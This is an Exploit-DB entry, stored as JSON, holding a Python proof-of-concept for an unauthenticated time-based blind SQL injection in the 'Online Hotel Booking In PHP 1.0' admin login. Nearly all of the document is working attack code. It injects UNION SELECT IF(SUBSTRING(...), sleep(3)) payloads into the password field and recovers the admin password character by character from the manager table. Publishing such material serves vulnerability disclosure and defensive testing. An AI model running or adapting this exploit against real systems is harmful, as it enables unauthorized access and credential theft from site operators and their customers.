{"source": "https://www.exploit-db.com/exploits/51938", "vulnName": "Online Hotel Booking In PHP 1.0 - Blind SQL Injection (Unauthenticated)", "vulnEDBID": "51938", "vulnCVE": "N/A", "author": "GIAN PARIS C. AGSAM", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title:  Online Hotel Booking In PHP 1.0 - Blind SQL Injection (Unauthenticated)\n# Google Dork: n/a\n# Date: 04/02/2024\n# Exploit Author: Gian Paris C. Agsam\n# Vendor Homepage: https://github.com/projectworldsofficial\n# Software Link: https://projectworlds.in/wp-content/uploads/2019/06/hotel-booking.zip\n# Version: 1.0\n# Tested on: Apache/2.4.58 (Debian) / PHP 8.2.12\n# CVE : n/a\n\nimport requests\nimport argparse\nfrom colorama import (Fore as F, Back as B, Style as S)\n\nBR,FT,FR,FG,FY,FB,FM,FC,ST,SD,SB,FW = B.RED,F.RESET,F.RED,F.GREEN,F.YELLOW,F.BLUE,F.MAGENTA,F.CYAN,S.RESET_ALL,S.DIM,S.BRIGHT,F.WHITE\n\nrequests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\nproxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}\n\nparser = argparse.ArgumentParser(description='Exploit Blind SQL Injection')\nparser.add_argument('-u', '--url', help='')\nargs = parser.parse_args()\n\n\ndef banner():\n    print(f\"\"\"{FR}\n      \u00b7\u2584\u2584\u2584\u00b7\u2584\u2584\u2584.\u2584\u2584 \u00b7 \u2584\u2584\u2584 . \u2584\u2584\u00b7 \u00b7\u2584\u2584\u2584\u2584  \u2584\u2584\u2584        \u25aa  \u00b7\u2584\u2584\u2584\u2584  \n\u25aa     \u2590\u2584\u2584\u00b7\u2590\u2584\u2584\u00b7\u2590\u2588 \u2580. \u2580\u2584.\u2580\u00b7\u2590\u2588 \u258c\u25aa\u2588\u2588\u25aa \u2588\u2588 \u2580\u2584 \u2588\u00b7\u25aa     \u2588\u2588 \u2588\u2588\u25aa \u2588\u2588 \n \u2584\u2588\u2580\u2584 \u2588\u2588\u25aa \u2588\u2588\u25aa \u2584\u2580\u2580\u2580\u2588\u2584\u2590\u2580\u2580\u25aa\u2584\u2588\u2588 \u2584\u2584\u2590\u2588\u00b7 \u2590\u2588\u258c\u2590\u2580\u2580\u2584  \u2584\u2588\u2580\u2584 \u2590\u2588\u00b7\u2590\u2588\u00b7 \u2590\u2588\u258c\n\u2590\u2588\u258c.\u2590\u258c\u2588\u2588\u258c.\u2588\u2588\u258c.\u2590\u2588\u2584\u25aa\u2590\u2588\u2590\u2588\u2584\u2584\u258c\u2590\u2588\u2588\u2588\u258c\u2588\u2588. \u2588\u2588 \u2590\u2588\u2022\u2588\u258c\u2590\u2588\u258c.\u2590\u258c\u2590\u2588\u258c\u2588\u2588. \u2588\u2588 \n \u2580\u2588\u2584\u2580\u25aa\u2580\u2580\u2580 \u2580\u2580\u2580  \u2580\u2580\u2580\u2580  \u2580\u2580\u2580 \u00b7\u2580\u2580\u2580 \u2580\u2580\u2580\u2580\u2580\u2022 .\u2580  \u2580 \u2580\u2588\u2584\u2580\u25aa\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2580\u2022 \n        Github: https://github.com/offensive-droid \n        {FW}\n    \"\"\")\n\n\n# Define the characters to test\nchars = [\n    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',\n    'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D',\n    'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S',\n    'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7',\n    '8', '9', '@', '#'\n]\n\ndef sqliPayload(char, position, userid, column, table):\n    sqli = 'admin\\' UNION SELECT IF(SUBSTRING('\n    sqli += str(column) + ','\n    sqli += str(position) + ',1) = \\''\n    sqli += str(char) + '\\',sleep(3),null) FROM '\n    sqli += str(table) + ' WHERE uname=\"admin\"\\''\n    return sqli\n\ndef postRequest(URL, sqliReq, char, position):\n    sqliURL = URL\n    params = {\"emailusername\": \"admin\", \"password\": sqliReq, \"submit\": \"Login\"}\n    req = requests.post(url=sqliURL, data=params, verify=False, proxies=proxies, timeout=10)\n    if req.elapsed.total_seconds() >= 2:\n        print(\"{} : {}\".format(char, req.elapsed.total_seconds()))\n        return char\n\n    return ''\n\ndef theHarvester(target, CHARS, url):\n    #print(\"Retrieving: {} {} {}\".format(target['table'], target['column'], target['id']))\n    print(\"Retrieving admin password\".format(target['table'], target['column'], target['id']))\n    position = 1\n    full_pass = \"\"\n    while position < 5:\n        for char in CHARS:\n            sqliReq = sqliPayload(char, position, target['id'], target['column'], target['table'])\n            found_char = postRequest(url, sqliReq, char, position)\n            full_pass += found_char\n        position += 1\n    return full_pass\n\nif __name__ == \"__main__\":\n    banner()\n    HOST = str(args.url)\n    PATH = HOST + \"/hotel booking/admin/login.php\"\n    adminPassword = {\"id\": \"1\", \"table\": \"manager\", \"column\": \"upass\"}\n    adminPass = theHarvester(adminPassword, chars, PATH)\n    print(\"Admin Password:\", adminPass)\n            "}